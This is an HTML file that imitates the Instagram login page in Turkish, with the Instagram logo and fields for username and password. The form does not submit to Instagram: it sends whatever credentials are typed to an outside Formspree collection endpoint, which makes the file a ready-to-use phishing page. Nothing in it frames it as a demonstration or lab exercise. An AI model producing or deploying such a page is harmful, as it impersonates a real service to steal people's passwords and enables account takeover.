<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Instagram</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram" class="logo">
      <form action="https://formspree.io/f/meogvayz" method="POST">
        <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
        <input type="password" name="password" placeholder="Şifre" required>
        <button type="submit">Giriş Yap</button>
      </form>
      <div class="divider"><span>VEYA</span></div>
      <button class="fb-login">Facebook ile Giriş Yap</button>
      <a href="#" class="forgot">Şifreni mi unuttun?</a>
    </div>
    <div class="signup-box">
      <p>Hesabın yok mu? <a href="#">Kaydol</a></p>
    </div>
  </div>
</body>
</html>
